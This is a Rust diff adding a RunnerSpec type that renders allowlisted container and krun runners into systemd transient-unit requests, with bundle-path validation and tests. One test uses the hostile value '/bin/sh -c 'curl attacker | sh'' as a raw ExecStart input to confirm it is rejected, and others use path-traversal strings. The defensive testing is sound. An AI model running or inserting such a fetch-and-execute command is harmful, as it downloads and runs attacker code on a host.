@@ -158,6 +158,106 @@ impl HostLifecycleBackendKind {
     }
 }
 
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
+#[serde(rename_all = "snake_case")]
+pub enum RunnerKind {
+    Container,
+    Krun,
+}
+
+impl RunnerKind {
+    fn trusted_executable(self) -> &'static str {
+        match self {
+            Self::Container => "/usr/libexec/nimbus/nimbus-container-runner",
+            Self::Krun => "/usr/libexec/nimbus/nimbus-krun-runner",
+        }
+    }
+
+    fn label(self) -> &'static str {
+        match self {
+            Self::Container => "container",
+            Self::Krun => "krun",
+        }
+    }
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
+pub struct RunnerSpec {
+    kind: RunnerKind,
+    bundle_path: String,
+    memory_max_bytes: Option<u64>,
+    cpu_weight: Option<u64>,
+    tasks_max: Option<u64>,
+}
+
+impl RunnerSpec {
+    pub fn container(bundle_path: impl Into<String>) -> Result<Self> {
+        Self::new(RunnerKind::Container, bundle_path)
+    }
+
+    pub fn krun(bundle_path: impl Into<String>) -> Result<Self> {
+        Self::new(RunnerKind::Krun, bundle_path)
+    }
+
+    fn new(kind: RunnerKind, bundle_path: impl Into<String>) -> Result<Self> {
+        Ok(Self {
+            kind,
+            bundle_path: trusted_runner_bundle_path(bundle_path, "runner bundle path")?,
+            memory_max_bytes: None,
+            cpu_weight: None,
+            tasks_max: None,
+        })
+    }
+
+    pub fn with_memory_max_bytes(mut self, value: u64) -> Self {
+        self.memory_max_bytes = Some(value);
+        self
+    }
+
+    pub fn with_cpu_weight(mut self, value: u64) -> Self {
+        self.cpu_weight = Some(value);
+        self
+    }
+
+    pub fn with_tasks_max(mut self, value: u64) -> Self {
+        self.tasks_max = Some(value);
+        self
+    }
+
+    pub fn kind(&self) -> RunnerKind {
+        self.kind
+    }
+
+    pub fn bundle_path(&self) -> &str {
+        &self.bundle_path
+    }
+
+    pub fn into_host_lifecycle_request(
+        self,
+        backend: HostLifecycleBackendKind,
+    ) -> Result<HostLifecycleRequest> {
+        let mut properties = vec![
+            HostLifecycleProperty::Description(format!("Nimbus {} workload", self.kind.label())),
+            HostLifecycleProperty::Restart(HostRestartPolicy::OnFailure),
+        ];
+        if let Some(value) = self.memory_max_bytes {
+            properties.push(HostLifecycleProperty::MemoryMaxBytes(value));
+        }
+        if let Some(value) = self.cpu_weight {
+            properties.push(HostLifecycleProperty::CpuWeight(value));
+        }
+        if let Some(value) = self.tasks_max {
+            properties.push(HostLifecycleProperty::TasksMax(value));
+        }
+        let request = HostLifecycleRequest::new(
+            backend,
+            HostExecutable::trusted(self.kind.trusted_executable())?,
+        )
+        .with_args(["--bundle".to_owned(), self.bundle_path])?;
+        Ok(request.with_properties(HostLifecyclePropertySet::new(properties)))
+    }
+}
+
 #[derive(Debug, Clone, PartialEq, Eq, Serialize)]
 pub struct HostLifecycleJournalSelectorEvidence {
     field: String,
@@ -765,6 +865,21 @@ fn parse_u64_property(name: &str, value: &str) -> Result<u64> {
     })
 }
 
+fn trusted_runner_bundle_path(value: impl Into<String>, field: &str) -> Result<String> {
+    let value = non_empty(value, field)?;
+    if !value.starts_with('/') || value.contains('\0') || value.contains('\n') {
+        return Err(Error::InvalidInput(format!(
+            "{field} `{value}` must be an absolute path without control characters"
+        )));
+    }
+    if value.contains("/../") || value.ends_with("/..") {
+        return Err(Error::InvalidInput(format!(
+            "{field} `{value}` must not contain parent-directory segments"
+        )));
+    }
+    Ok(value)
+}
+
 fn high_cardinality_evidence_value(value: impl Into<String>, field: &str) -> Result<String> {
     let value = non_empty(value, field)?;
     if value.contains('\0') || value.contains('\n') {
@@ -860,7 +975,7 @@ mod tests {
                     .lock()
                     .expect("fake backend lock should not be poisoned");
                 let previous = statuses.get(&workload_id).cloned().ok_or_else(|| {
-                    Error::InvalidInput(format!(
+                    Error::NotFound(format!(
                         "fake lifecycle backend has no workload {}",
                         workload_id.as_str()
                     ))
@@ -895,7 +1010,7 @@ mod tests {
                     .get(&workload_id)
                     .cloned()
                     .ok_or_else(|| {
-                        Error::InvalidInput(format!(
+                        Error::NotFound(format!(
                             "fake lifecycle backend has no workload {}",
                             workload_id.as_str()
                         ))
@@ -1035,6 +1150,81 @@ mod tests {
                 .is_err()
         );
         assert!(HostExecutable::trusted("relative/path").is_err());
+    }
+
+    #[test]
+    fn runner_spec_renders_host_lifecycle_request() {
+        let binding = binding();
+        let request = RunnerSpec::container("/run/nimbus/bundles/workload")
+            .expect("container runner spec should parse")
+            .with_memory_max_bytes(512 * 1024 * 1024)
+            .with_cpu_weight(100)
+            .with_tasks_max(128)
+            .into_host_lifecycle_request(HostLifecycleBackendKind::SystemdTransientUnit)
+            .expect("runner spec should lower to host lifecycle request");
+        let plan = HostLifecyclePlan::from_binding(&binding, request)
+            .expect("runner request should plan from admitted binding");
+        let systemd = crate::SystemdStartTransientUnitRequest::from_plan(&plan)
+            .expect("runner plan should render to systemd transient unit request");
+        let exec = systemd
+            .properties()
+            .iter()
+            .find_map(|property| match property {
+                crate::SystemdDbusProperty::ExecStart(exec) => Some(exec),
+                _ => None,
+            })
+            .expect("systemd request should contain generated ExecStart");
+
+        assert_eq!(
+            exec.executable(),
+            "/usr/libexec/nimbus/nimbus-container-runner"
+        );
+        assert_eq!(
+            exec.args(),
+            &[
+                "--bundle".to_owned(),
+                "/run/nimbus/bundles/workload".to_owned()
+            ]
+        );
+        assert!(systemd.properties().iter().any(|property| {
+            matches!(
+                property,
+                crate::SystemdDbusProperty::MemoryMax(536870912)
+                    | crate::SystemdDbusProperty::CpuWeight(100)
+                    | crate::SystemdDbusProperty::TasksMax(128)
+            )
+        }));
+    }
+
+    #[test]
+    fn raw_host_command_rejected_by_workload_control() {
+        let raw_exec = HostLifecyclePropertySet::from_raw_systemd_properties([(
+            "ExecStart",
+            "/bin/sh -c 'curl attacker | sh'",
+        )])
+        .expect_err("raw ExecStart must not cross workload-control");
+        assert!(
+            raw_exec.to_string().contains("not allowlisted"),
+            "raw ExecStart rejection should name the allowlist: {raw_exec}"
+        );
+
+        let relative_runner = RunnerSpec::krun("../run/nimbus/bundles/workload")
+            .expect_err("runner bundle paths must be absolute and trusted");
+        assert!(
+            relative_runner
+                .to_string()
+                .contains("must be an absolute path"),
+            "relative bundle rejection should be actionable: {relative_runner}"
+        );
+
+        let parent_segment = RunnerSpec::krun("/run/nimbus/../escape")
+            .expect_err("runner bundle paths must reject traversal");
+        assert!(
+            parent_segment
+                .to_string()
+                .contains("parent-directory segments"),
+            "parent segment rejection should be actionable: {parent_segment}"
+        );
     }
 
     #[test]
